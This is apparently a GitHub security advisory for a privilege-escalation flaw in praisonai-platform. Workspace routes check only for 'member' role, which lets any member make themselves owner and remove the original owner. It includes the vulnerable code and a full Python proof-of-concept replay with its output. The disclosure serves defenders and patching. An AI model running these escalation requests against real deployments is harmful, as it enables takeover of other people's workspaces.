# [H] PraisonAI Platform: Missing role checks let any workspace member become owner and control workspace membership

## Summary
Severity: High
Advisory: GHSA-h37g-4h4p-9x97
CVE: CVE-2026-47405
CWE: CWE-284, CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-h37g-4h4p-9x97
Type: github-advisory

## Affected
- PyPI: `praisonai-platform` — affected >=0 <0.1.4

## Details
### Summary

PraisonAI Platform has a broken workspace authorization check that allows any authenticated low-privilege workspace member to escalate their own role to `owner`.

The issue is caused by privileged workspace-management routes using the shared dependency `require_workspace_member(...)` without requiring `admin` or `owner`. The dependency defaults to `min_role="member"`, so routes that should be administrative are accessible to ordinary workspace members.

As a result, a normal workspace member can:

- promote their own account from `member` to `owner`;
- add arbitrary users as `owner` or `admin`;
- change other members' roles;
- remove legitimate owners or members;
- take over workspace membership completely;
- perform destructive workspace operations after escalation.

This is a broken access control / vertical privilege escalation vulnerability.

### Details

The vulnerable authorization dependency is defined in:

```text
praisonai_platform/api/deps.py
````

The dependency defaults to the lowest workspace role:

```python
async def require_workspace_member(
    workspace_id: str,
    user: AuthIdentity = Depends(get_current_user),
    session: AsyncSession = Depends(get_db),
    min_role: str = "member",
) -> AuthIdentity:
    ...
    has = await member_svc.has_role(workspace_id, user.id, min_role)
```

Because `min_role` defaults to `"member"`, any route using:

```python
Depends(require_workspace_member)
```

without explicitly passing a stronger role only requires ordinary workspace membership.

Privileged workspace-management routes in:

```text
praisonai_platform/api/routes/workspaces.py
```

use this dependency unchanged on administrative actions, including:

```text
PATCH  /workspaces/{workspace_id}
DELETE /workspaces/{workspace_id}
POST   /workspaces/{workspace_id}/members
PATCH  /workspaces/{workspace_id}/members/{user_id}
DELETE /workspaces/{workspace_id}/members/{user_id}
```

These routes allow workspace modification, deletion, member addition, role changes, and member removal. They should require `admin` or `owner`, but they currently require only `member`.

The membership service does not provide a second authorization layer. In:

```text
praisonai_platform/services/member_service.py
```

the mutation methods perform the requested change after the route-level check passes:

```python
async def add(...):
    member = Member(workspace_id=workspace_id, user_id=user_id, role=role)

async def update_role(...):
    member = await self.get(workspace_id, user_id)
    member.role = new_role

async def remove(...):
    member = await self.get(workspace_id, user_id)
    await self._session.delete(member)
```

Therefore, the weak route dependency is the effective authorization boundary.

A low-privilege user can also learn their own `user.id` from the normal authentication response. The login/register response includes the authenticated user object:

```text
TokenResponse.token
TokenResponse.user.id
```

This allows an invited low-privilege member to target their own membership record and self-promote.

### Affected component

```text
Package: praisonai-platform
Verified version: 0.1.2
Verified source commit: d8a8a78
Affected components:
- praisonai_platform/api/deps.py
- praisonai_platform/api/routes/workspaces.py
- praisonai_platform/services/member_service.py
- praisonai_platform/api/routes/auth.py
- praisonai_platform/api/schemas.py
```

### PoC

The following PoC is self-contained and exercises the real PraisonAI Platform FastAPI application path. It does not mock the vulnerable RBAC logic.

The PoC:

1. Creates the real FastAPI app with `praisonai_platform.api.app.create_app()`.
2. Registers three users through the real `/api/v1/auth/register` route.
3. Creates a workspace as the original owner.
4. Adds the second user as a normal `member`.
5. Logs in as that low-privilege member.
6. Uses the low-privilege member token to self-promote to `owner`.
7. Uses the same token to add a third account as `owner`.
8. Uses the same token to remove the original owner.
9. Confirms the workspace membership has been taken over.

#### Full PoC code

```python
#!/usr/bin/env python3
"""Self-contained local replay for PraisonAI Platform workspace RBAC bypass."""

from __future__ import annotations

import asyncio
import os
import sys
import types
import uuid
from pathlib import Path

from httpx import ASGITransport, AsyncClient
from sqlalchemy.ext.asyncio import create_async_engine


REPO_ROOT = Path(__file__).resolve().parents[3] / "repos" / "praisonai"
PLATFORM_ROOT = REPO_ROOT / "src" / "praisonai-platform"
AGENTS_ROOT = REPO_ROOT / "src" / "praisonai-agents"


def verify_source() -> None:
    expected = {
        PLATFORM_ROOT / "praisonai_platform/api/deps.py": [
            'min_role: str = "member"',
            "member_svc.has_role(workspace_id, user.id, min_role)",
        ],
        PLATFORM_ROOT / "praisonai_platform/api/routes/workspaces.py": [
            '@router.patch("/{workspace_id}", response_model=WorkspaceResponse)',
            '@router.delete("/{workspace_id}", status_code=status.HTTP_204_NO_CONTENT)',
            '@router.post("/{workspace_id}/members", response_model=MemberResponse, status_code=status.HTTP_201_CREATED)',
            '@router.patch("/{workspace_id}/members/{user_id}", response_model=MemberResponse)',
        ],
        PLATFORM_ROOT / "praisonai_platform/services/member_service.py": [
            "member.role = new_role",
            "await self._session.delete(member)",
        ],
    }

    for path, needles in expected.items():
        text = path.read_text(encoding="utf-8")
        for needle in needles:
            if needle not in text:
                raise RuntimeError(f"source verification failed: {needle!r} not found in {path}")


async def main() -> int:
    if not PLATFORM_ROOT.exists() or not AGENTS_ROOT.exists():
        raise SystemExit("missing local PraisonAI source tree")

    verify_source()

    sys.path.insert(0, str(PLATFORM_ROOT))
    sys.path.insert(0, str(AGENTS_ROOT))

    # Minimal passlib stub for local replay environments where passlib is not installed.
    # This keeps the PoC focused on the authorization bug rather than dependency setup.
    if "passlib" not in sys.modules:
        passlib_pkg = types.ModuleType("passlib")
        passlib_pkg.__path__ = []
        sys.modules["passlib"] = passlib_pkg

    if "passlib.context" not in sys.modules:
        passlib_context = types.ModuleType("passlib.context")

        class _CryptContext:
            def __init__(self, *args, **kwargs):
                pass

            def hash(self, password: str) -> str:
                return f"stub::{password}"

            def verify(self, password: str, hashed: str) -> bool:
                return hashed == f"stub::{password}"

        passlib_context.CryptContext = _CryptContext
        sys.modules["passlib.context"] = passlib_context

    # Keep JWT generation deterministic for the local replay.
    os.environ["PLATFORM_JWT_SECRET"] = "test-secret-for-testing-only"

    from praisonai_platform.api.app import create_app
    from praisonai_platform.db.base import Base, reset_engine
    from praisonai_platform.db import base as base_mod

    await reset_engine()

    engine = create_async_engine(
        "sqlite+aiosqlite:///:memory:",
        echo=False,
        connect_args={"check_same_thread": False},
    )

    base_mod._engine = engine
    base_mod._session_factory = None

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    app = create_app()
    suffix = uuid.uuid4().hex[:8]
    password = "Password123!"

    transport = ASGITransport(app=app)

    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Register an owner account.
        owner = await client.post(
            "/api/v1/auth/register",
            json={
                "email": f"owner_{suffix}@example.com",
                "password": password,
                "name": f"owner_{suffix}",
            },
        )

        # 2. Register a low-privilege member account.
        member = await client.post(
            "/api/v1/auth/register",
            json={
                "email": f"member_{suffix}@example.com",
                "password": password,
                "name": f"member_{suffix}",
            },
        )

        # 3. Register a third attacker-controlled account.
        extra = await client.post(
            "/api/v1/auth/register",
            json={
                "email": f"extra_{suffix}@example.com",
                "password": password,
                "name": f"extra_{suffix}",
            },
        )

        owner_json = owner.json()
        member_json = member.json()
        extra_json = extra.json()

        owner_headers = {"Authorization": f"Bearer {owner_json['token']}"}
        member_headers = {"Authorization": f"Bearer {member_json['token']}"}

        # 4. Create a workspace as the owner.
        workspace = await client.post(
            "/api/v1/workspaces/",
            json={
                "name": f"ws-{suffix}",
                "slug": f"ws-{suffix}",
                "description": "rbac bypass poc",
            },
            headers=owner_headers,
        )

        workspace_id = workspace.json()["id"]

        # 5. Owner adds the second user as a normal low-privilege member.
        added_member = await client.post(
            f"/api/v1/workspaces/{workspace_id}/members",
            json={
                "user_id": member_json["user"]["id"],
                "role": "member",
            },
            headers=owner_headers,
        )

        # 6. Low-privilege member self-promotes to owner.
        promoted = await client.patch(
            f"/api/v1/workspaces/{workspace_id}/members/{member_json['user']['id']}",
            json={
                "role": "owner",
            },
            headers=member_headers,
        )

        # 7. The same formerly-low-privilege member adds a third account as owner.
        added_owner = await client.post(
            f"/api/v1/workspaces/{workspace_id}/members",
            json={
                "user_id": extra_json["user"]["id"],
                "role": "owner",
            },
            headers=member_headers,
        )

        # 8. The same account removes the original owner.
        removed_original_owner = await client.delete(
            f"/api/v1/workspaces/{workspace_id}/members/{owner_json['user']['id']}",
            headers=member_headers,
        )

        # 9. Confirm remaining membership state.
        remaining_members = await client.get(
            f"/api/v1/workspaces/{workspace_id}/members",
            headers=member_headers,
        )

        remaining_roles = [m["role"] for m in remaining_members.json()]

        print(f"[poc] owner_status={owner.status_code}")
        print(f"[poc] member_status={member.status_code}")
        print(f"[poc] extra_status={extra.status_code}")
        print(f"[poc] workspace_status={workspace.status_code}")
        print(f"[poc] add_status={added_member.status_code} role={added_member.json()['role']}")
        print(f"[poc] promote_status={promoted.status_code} role={promoted.json()['role']}")
        print(f"[poc] add_owner_status={added_owner.status_code} role={added_owner.json()['role']}")
        print(f"[poc] remove_original_owner_status={removed_original_owner.status_code}")
        print(f"[poc] remaining_roles={remaining_roles}")

        if promoted.status_code != 200 or promoted.json()["role"] != "owner":
            raise SystemExit("[poc] MISS: low-privilege member did not become owner")

        if added_owner.status_code != 201 or added_owner.json()["role"] != "owner":
            raise SystemExit("[poc] MISS: promoted attacker could not add a new owner")

        if removed_original_owner.status_code != 204:
            raise SystemExit("[poc] MISS: promoted attacker could not remove the original owner")

        if remaining_roles.count("owner") < 2:
            raise SystemExit("[poc] MISS: expected attacker-controlled owners after takeover")

        print("[poc] HIT: low-privilege member became owner and took over workspace membership")

    await engine.dispose()
    base_mod._engine = None
    base_mod._session_factory = None

    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
```

#### Observed output

```text
[poc] owner_status=201
[poc] member_status=201
[poc] extra_status=201
[poc] workspace_status=201
[poc] add_status=201 role=member
[poc] promote_status=200 role=owner
[poc] add_owner_status=201 role=owner
[poc] remove_original_owner_status=204
[poc] remaining_roles=['owner', 'owner']
[poc] HIT: low-privilege member became owner and took over workspace membership
```

#### Expected secure behavior

The following request should be rejected when made by a plain `member`:

```http
PATCH /api/v1/workspaces/{workspace_id}/members/{member_user_id}
Authorization: Bearer <member_token>
Content-Type: application/json

{
  "role": "owner"
}
```

Expected response:

```text
403 Forbidden
```

#### Actual vulnerable behavior

The request succeeds:

```text
HTTP 200
role = owner
```

The same account can then add attacker-controlled owners and remove the original owner.

### Impact

A low-privilege workspace member can fully take over a workspace.

Impact includes:

* self-promoting from `member` to `owner` or `admin`;
* granting `owner` or `admin` to attacker-controlled accounts;
* changing other members' roles;
* removing legitimate owners or members;
* modifying workspace metadata and settings;
* deleting the workspace;
* taking over workspace-scoped issues, projects, labels, agents, and other resources after role escalation.

The attacker only needs an authenticated low-privilege membership in the target workspace. No race condition, special deployment, or administrator action is required.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-h37g-4h4p-9x97
- https://github.com/MervinPraison/PraisonAI
